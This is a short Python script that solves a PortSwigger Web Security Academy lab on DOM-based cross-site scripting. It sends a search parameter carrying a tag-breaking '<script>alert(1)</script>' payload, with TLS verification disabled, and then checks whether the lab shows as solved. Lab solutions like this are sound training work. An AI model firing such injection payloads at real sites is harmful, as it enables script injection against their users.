import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink
# author: 0xyf


class XSS3:
    def __init__(self):
        self.lab_id = "0a4d00a1030c50d1801ff35200ae000b"
        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.proxies = {"https": "http://127.0.0.1:8080"}

    def execute_request(self, payload):
        params = {"search": payload}
        r = requests.get(
            f"{self.url}",
            params=params,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def dom_xss(self):
        payload = '0xyf"><script>alert(1)</script>'
        r = self.execute_request(payload)

    def check_solved(self):
        sleep(2)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.dom_xss()
        self.check_solved()


def main():
    XSS3().solve()


if __name__ == "__main__":
    main()
